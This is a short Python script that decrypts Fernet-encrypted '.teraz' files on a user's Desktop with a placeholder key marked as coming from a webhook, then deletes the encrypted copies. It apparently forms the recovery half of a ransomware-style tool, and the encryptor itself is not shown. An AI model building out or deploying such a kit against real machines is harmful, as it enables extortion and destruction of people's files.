import os
from cryptography.fernet import Fernet

def dekripsi_file(file_path, key):
    f = Fernet(key)
    with open(file_path, 'rb') as file:
        file_data = file.read()
    decrypted_data = f.decrypt(file_data)
    with open(file_path.replace('.teraz', ''), 'wb') as file:
        file.write(decrypted_data)
    os.remove(file_path)

DESKTOP_DIR = os.path.join(os.environ.get('USERPROFILE', os.environ.get('HOME', '/')), 'Desktop')

key = b'KEY_FROM_WEBHOOK'  

for file in os.listdir(DESKTOP_DIR):
    if file.endswith(".teraz"):
        dekripsi_file(os.path.join(DESKTOP_DIR, file), key)